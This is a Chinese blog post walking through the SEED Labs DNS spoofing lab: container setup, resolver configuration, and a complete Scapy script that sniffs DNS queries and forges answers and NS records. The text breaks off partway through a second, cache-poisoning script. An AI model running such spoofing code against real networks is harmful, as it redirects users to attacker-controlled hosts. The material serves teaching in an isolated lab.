<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SEEDLAB：DNS欺骗实验 | Enboy_Yu's blog</title><meta name="keywords" content="seedlab DNS欺骗"><meta name="author" content="Enboy_Yu"><meta name="copyright" content="Enboy_Yu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、    实验目的 1 overview本实验的目标是获得对DNS（域名系统）的各种攻击的第一手经验。DNS是互联网的电话簿；它将主机名转换为IP地址，反之亦然。这种转换是通过DNS解析实现的，这种解析发生在幕后。DNS欺骗攻击以各种方式操纵此解析过程，目的是将用户误导到其他目的地，这些目的地通常是恶意的。本实验室主要研究几种DNS欺骗攻击技术。将首先设置和配置DNS服务器，然后在实验室环境中">
<meta property="og:type" content="article">
<meta property="og:title" content="SEEDLAB：DNS欺骗实验">
<meta property="og:url" content="https://02lxc.github.io/post/4aa986b5.html">
<meta property="og:site_name" content="Enboy_Yu&#39;s blog">
<meta property="og:description" content="一、    实验目的 1 overview本实验的目标是获得对DNS（域名系统）的各种攻击的第一手经验。DNS是互联网的电话簿；它将主机名转换为IP地址，反之亦然。这种转换是通过DNS解析实现的，这种解析发生在幕后。DNS欺骗攻击以各种方式操纵此解析过程，目的是将用户误导到其他目的地，这些目的地通常是恶意的。本实验室主要研究几种DNS欺骗攻击技术。将首先设置和配置DNS服务器，然后在实验室环境中">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&h=187&c=7&r=0&o=5&dpr=1.6&pid=1.7">
<meta property="article:published_time" content="2024-01-31T06:11:38.662Z">
<meta property="article:modified_time" content="2024-01-31T08:53:06.312Z">
<meta property="article:author" content="Enboy_Yu">
<meta property="article:tag" content="seedlab DNS欺骗">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&h=187&c=7&r=0&o=5&dpr=1.6&pid=1.7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://02lxc.github.io/post/4aa986b5"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-01-31 16:53:06'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><link rel="stylesheet" href="C:\blog-demo\node_modules\hexo-theme-butterfly\source\css\custom.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Enboy_Yu's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SEEDLAB：DNS欺骗实验</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-31T06:11:38.662Z" title="发表于 2024-01-31 14:11:38">2024-01-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-31T08:53:06.312Z" title="更新于 2024-01-31 16:53:06">2024-01-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B/">专业课程</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SEEDLAB：DNS欺骗实验"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><a name="cIZ0i"></a></p>
<h1 id="一、-实验目的"><a href="#一、-实验目的" class="headerlink" title="一、    实验目的"></a>一、    实验目的</h1><p><a name="Juc2u"></a></p>
<h2 id="1-overview"><a href="#1-overview" class="headerlink" title="1 overview"></a>1 overview</h2><p>本实验的目标是获得对DNS（域名系统）的各种攻击的第一手经验。DNS是互联网的电话簿；它将主机名转换为IP地址，反之亦然。这种转换是通过DNS解析实现的，这种解析发生在幕后。DNS欺骗攻击以各种方式操纵此解析过程，目的是将用户误导到其他目的地，这些目的地通常是恶意的。本实验室主要研究几种DNS欺骗攻击技术。将首先设置和配置DNS服务器，然后在实验室环境中的目标上尝试各种DNS欺骗攻击。<br />第一个大实验任务（本地DNS欺骗）中进行的攻击假设攻击者位于同一本地网络上，因此可以嗅探DNS数据包。这个假设是为了简化实验任务。<br />第二个大实验任务为远程DNS攻击实验，攻击者在没有嗅探数据包的情况下发起远程欺骗攻击，远程攻击实验室比本地DNS欺骗实验更具挑战性。</p>
<p><a name="vg0k9"></a></p>
<h1 id="二、-实验步骤及结果"><a href="#二、-实验步骤及结果" class="headerlink" title="二、    实验步骤及结果"></a>二、    实验步骤及结果</h1><p><a name="AvOlR"></a></p>
<h2 id="2-DNS-Local"><a href="#2-DNS-Local" class="headerlink" title="2  DNS _Local"></a><strong>2  DNS _Local</strong></h2><p><a name="sVEWg"></a></p>
<h3 id="2-1-环境搭建"><a href="#2-1-环境搭建" class="headerlink" title="2.1 环境搭建"></a><strong>2.1 环境搭建</strong></h3><p><a name="KnXw7"></a></p>
<h4 id="容器部署"><a href="#容器部署" class="headerlink" title="容器部署"></a>容器部署</h4><ol>
<li>清除上次docker网络环境<br /> <img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701678793480-ac777812-d723-4a4d-b8b4-50e60141556e.png#averageHue=%230c0b0a&clientId=u16fa8936-5c81-4&from=paste&height=241&id=ucbd9ce0c&originHeight=380&originWidth=1035&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=86269&status=done&style=none&taskId=ube52703e-2d63-4803-b9c2-38cb4c00f96&title=&width=657.1428869857283" alt="image.png"></li>
<li>启动本次实验的容器</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701679618439-28cfbfd2-bdb1-4f04-ba46-ecf1514c523d.png#averageHue=%230e0c09&clientId=u16fa8936-5c81-4&from=paste&height=383&id=u0b043e9e&originHeight=665&originWidth=1061&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=167544&status=done&style=none&taskId=u01969ea7-a3e6-4e52-b6ca-9fb5f9de8e1&title=&width=610.6508178710938" alt="image.png"></p>
<ol start="3">
<li>LAN结构</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701679771240-3de7a6f0-b7e7-47f7-b7ab-4c3f9e416a5f.png#averageHue=%23f3f3f2&clientId=u16fa8936-5c81-4&from=paste&height=307&id=u28780c7f&originHeight=817&originWidth=1459&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=181106&status=done&style=none&taskId=u80101b35-62f5-483b-9cc3-733b4f4230a&title=&width=548.3492431640625" alt="image.png"><br />我们启动时用对应的CONTAINER ID即可：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701680085493-050c2f4e-710c-45b6-bf67-2a65f6358e8b.png#averageHue=%230a0806&clientId=u16fa8936-5c81-4&from=paste&height=140&id=u1ee44b64&originHeight=190&originWidth=622&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=42996&status=done&style=none&taskId=ud639dadd-1a5f-4f23-b1c1-01c0ad1458b&title=&width=458.9980163574219" alt="image.png"><br><a name="witbD"></a></p>
<h4 id="了解攻击者容器"><a href="#了解攻击者容器" class="headerlink" title="了解攻击者容器"></a>了解攻击者容器</h4><p><a name="FjMjj"></a></p>
<h5 id="•-Shared-folder"><a href="#•-Shared-folder" class="headerlink" title="• Shared folder"></a>• <em>Shared folder</em></h5><p>当我们使用攻击者容器来启动攻击时，我们需要将攻击代码放在攻击者容器中。代码编辑在VM中比在容器中更方便，因为我们可以使用我们最喜欢的编辑器。为了让VM和容器共享文件，我们已经使用Docker卷在VM和容器之间创建了一个共享文件夹。如果您查看Docker组成文件，您会发现我们已经在一些容器中添加了以下条目。表示将主机（即VM)上的.&#x2F;volues文件夹装载到容器内的&#x2F;volues文件夹。我们将把代码写入.&#x2F;volous文件夹（在VM上），以便它们可以在容器中使用。<br><a name="LAiS2"></a></p>
<h5 id="•-Host-mode"><a href="#•-Host-mode" class="headerlink" title="• Host mode"></a>• <em>Host mode</em></h5><p>在这个实验室中，攻击者需要能够嗅探数据包，但在一个容器内运行嗅探程序有问题，因为一个容器是有效地连接到一个虚拟的开关，所以它只能看到自己的流量，它永远不会看到其他容器中的数据包。为了解决这个问题，我们使用了攻击者容器的主机模式。这允许攻击者容器查看所有的流量。在攻击者容器上使用的下列条目如下：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699862046796-34d40ca0-6038-4889-817f-b9c55814149f.png#averageHue=%2323201f&clientId=u57db4859-e4a5-4&from=paste&height=230&id=wDUT6&originHeight=362&originWidth=647&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=30031&status=done&style=none&taskId=uacb9c441-0b90-4c1d-85b5-f916e649675&title=&width=410.79366944904945" alt="image.png"><br />当容器处于host模式时，它可以看到所有主机的网络接口，它甚至具有与主机具有相同的IP地址。基本上，它与主机虚拟机放在相同的网络名称空间中。但是，容器仍然是一个独立的机器，因为它的其他名称空间仍然与主机不同。<br><a name="X2l4H"></a></p>
<h4 id="DNS配置"><a href="#DNS配置" class="headerlink" title="DNS配置"></a>DNS配置</h4><p><strong>1）Local DNS Server(对应10.9.0.53)</strong></p>
<ul>
<li>简化：将源端口号固定为33333（DNS服务器会将DNS请求的源端口号随机化使得攻击更加困难）。文件named.conf.options:</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701688949108-d5dc9176-9697-43ec-b93a-0fa8022c2ac3.png#averageHue=%23252423&clientId=ufc1ead2d-f657-4&from=paste&height=29&id=u7f1e2763&originHeight=46&originWidth=460&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=3907&status=done&style=none&taskId=ud11e973c-0c88-4353-8381-9f92a7a6789&title=&width=292.06350532699037" alt="image.png"></p>
<ul>
<li>关闭DNSSEC（DNSSEC 是防止DNS欺骗的保护机制）。文件named.conf.options:</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701689281138-1f4f5cd1-1c75-495b-8932-a5657b99cbbb.png#averageHue=%23302f2d&clientId=ufc1ead2d-f657-4&from=paste&height=44&id=u33761ff7&originHeight=57&originWidth=360&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=6013&status=done&style=none&taskId=ucbfa7597-491a-43bf-b9c0-31dfe781503&title=&width=279.56549072265625" alt="image.png"></p>
<ul>
<li>转发到attacker32.com区域。此如果有人查询attacker32.com域，查询将被转发到该域的名称服务器，该服务器托管在攻击者容器中。区域条目被放在命名的.conf文件中。</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701689582328-8a8d3df7-9ad6-4753-8627-294e1221a02e.png#averageHue=%23222120&clientId=ufc1ead2d-f657-4&from=paste&height=143&id=ufda0097c&originHeight=225&originWidth=377&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=13264&status=done&style=none&taskId=u2284d735-8f25-45d4-97e0-733827bb88d&title=&width=239.36509023538122" alt="image.png"><br /><strong>2）user</strong><br />在resolv.conf中将10.9.0.53添加为第一条nameserver记录，将local dns server作为首要的DNS服务器。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701689661316-701f4025-271f-4540-855d-377f88ebf0db.png#averageHue=%23a7926f&clientId=ufc1ead2d-f657-4&from=paste&height=102&id=ub19a7f56&originHeight=160&originWidth=839&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=16626&status=done&style=none&taskId=u2db0785b-63dd-46bd-b62a-52120ffa62c&title=&width=532.6984368898802" alt="image.png"><br /><strong>3）Attacker</strong><br />Attacker的nameserver（ named.conf），第一个为合法的zone attacker32.com，第二个为虚假的example.com zone：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701689836008-f3aab94c-d406-45c6-80c5-842c212f337c.png#averageHue=%23242221&clientId=ufc1ead2d-f657-4&from=paste&height=202&id=ufafa595b&originHeight=318&originWidth=594&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=25189&status=done&style=none&taskId=u2b3a6069-73b2-447b-99eb-2d34d3a87c4&title=&width=377.14287427007014" alt="image.png"><br><a name="e97hC"></a></p>
<h4 id="测试部署"><a href="#测试部署" class="headerlink" title="测试部署"></a>测试部署</h4><p><strong>Get the IP address of ns.attacker32.com</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701691667853-75a84f81-e342-4732-b854-6e8de8c22f2f.png#averageHue=%23232222&clientId=ufc1ead2d-f657-4&from=paste&height=383&id=ue1ae71ff&originHeight=657&originWidth=1110&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=80238&status=done&style=none&taskId=u5a7dc529-61dc-4a29-b18a-f81149d9673&title=&width=646.6349487304688" alt="image.png"></p>
<p><strong>Get the IP address of <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a></strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701692524460-5c3c1eab-b6cc-42a2-b2e4-b3acb0c1fd63.png#averageHue=%23242322&clientId=ufc1ead2d-f657-4&from=paste&height=418&id=u45591f75&originHeight=629&originWidth=893&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=69175&status=done&style=none&taskId=u79a275a1-e257-447f-801b-57ee36a3d67&title=&width=593.9801635742188" alt="image.png"><br />命令换为dig @ns.attacker32.com <a href="http://www.example.com，可以看到返回的内容与上面相同：">www.example.com，可以看到返回的内容与上面相同：</a><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701694101157-e4614cfd-6375-4436-aeae-ec612fc03f9a.png#averageHue=%23262423&clientId=ufc1ead2d-f657-4&from=paste&height=411&id=ub7682fea&originHeight=647&originWidth=937&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=73510&status=done&style=none&taskId=u097079b0-36b2-4ac9-9f8a-eca61afa6e7&title=&width=594.9206619378042" alt="image.png"><br><a name="Habcl"></a></p>
<h3 id="2-2-The-Attack-Tasks"><a href="#2-2-The-Attack-Tasks" class="headerlink" title="2.2 The Attack Tasks"></a><strong>2.2 The Attack Tasks</strong></h3><p><a name="Lmxw7"></a></p>
<h4 id="Task-1-Directly-Spoofing-Response-to-User"><a href="#Task-1-Directly-Spoofing-Response-to-User" class="headerlink" title="Task 1: Directly Spoofing Response to User"></a><strong>Task 1: Directly Spoofing Response to User</strong></h4><blockquote>
<p>当用户在web浏览器中键入网站的名称（主机名，如<a target="_blank" rel="noopener" href="http://www.example.com)时,用户的计算机将向本地dns服务器发送dns请求,以解析主机名的ip地址.攻击者可以嗅探dns请求消息,然后他们可以立即创建一个假的dns响应,并发送回用户机器.如果假回复比真实回复提前到达,它将被用户机器接受./">www.example.com）时，用户的计算机将向本地DNS服务器发送DNS请求，以解析主机名的IP地址。攻击者可以嗅探DNS请求消息，然后他们可以立即创建一个假的DNS响应，并发送回用户机器。如果假回复比真实回复提前到达，它将被用户机器接受。</a></p>
</blockquote>
<p><strong>在local DNS Server 使用命令rndc flush清除缓存</strong>。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701694496297-01ebc924-b3f3-40bc-97b4-db470e08d6ee.png#averageHue=%23252423&clientId=ufc1ead2d-f657-4&from=paste&height=104&id=ua1dc0443&originHeight=164&originWidth=944&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=27569&status=done&style=none&taskId=u0b9d252b-fc35-4988-9a59-d975f6baa0e&title=&width=599.3651065840845" alt="image.png"><br />每次攻击前都要清除缓存，如果缓存有答案，那么来自本地DNS服务器的回复将比我们的欺骗的回复更快，那么我们的的攻击将无法成功。</p>
<p>使用项目所给代码（别忘了改监听网卡）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">  <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">    <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">    UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># The Answer Section</span></span><br><span class="line">    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">                 </span><br><span class="line">    <span class="comment"># The Authority Section</span></span><br><span class="line">    NSsec = DNSRR(rrname=<span class="string">&#x27;example.net&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">                   </span><br><span class="line">    <span class="comment"># The Additional Section</span></span><br><span class="line">    <span class="comment"># Addsec = DNSRR(rrname=&#x27;ns1.example.net&#x27;, type=&#x27;A&#x27;, ttl=259200, rdata=&#x27;1.2.3.4&#x27;)                </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the DNS packet</span></span><br><span class="line">    DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>, qdcount=<span class="number">1</span>,</span><br><span class="line">                  ancount=<span class="number">1</span>, nscount=<span class="number">2</span>, arcount=<span class="number">2</span>, an=Anssec, ns=NSsec )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">    spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">    send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and dst port 53&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-ace020efb37f&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)      </span><br></pre></td></tr></table></figure>
<p>在seed-attacker容器内运行如下：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701695948025-8d2467b3-a593-4847-b62b-207e0693b6b0.png#averageHue=%23242322&clientId=ufc1ead2d-f657-4&from=paste&height=182&id=u47a609a5&originHeight=287&originWidth=890&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=33479&status=done&style=none&taskId=u50d72065-fce0-4437-a4b5-d016591ad7f&title=&width=565.0793907413508" alt="image.png"><br />user端进行dns请求，实际信息被篡改，即攻击成功：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701696333502-ef6eb033-8cb1-464f-bd38-c51141d8d284.png#averageHue=%23272222&clientId=ufc1ead2d-f657-4&from=paste&height=401&id=u5fba50bc&originHeight=631&originWidth=1048&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=66068&status=done&style=none&taskId=ud7e8d5cd-d8fc-49ba-b972-078167a7510&title=&width=665.3968556145345" alt="image.png"><br><a name="CBb3M"></a></p>
<h4 id="Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers"><a href="#Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers" class="headerlink" title="Task 2: DNS Cache Poisoning Attack – Spoofing Answers"></a><strong>Task 2: DNS Cache Poisoning Attack – Spoofing Answers</strong></h4><blockquote>
<p> task1将攻击目标聚焦于user，需要总是等待user进行请求，效率并不高。task2将目标聚焦于DNS server，会是更高效的方式，即DNS缓存投毒：如果攻击者伪装从其他DNS server来的响应，该DNS Server就会把内容存储在缓存中，会保留相当长的一段时间。在该期间的请求都会直接返回缓存内的结果。我们只需spoof一次，影响就会持续直到下次缓存更新。</p>
</blockquote>
<p>编写代码spoonf_answer.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">  <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;example.com&#x27;</span> <span class="keyword">in</span> 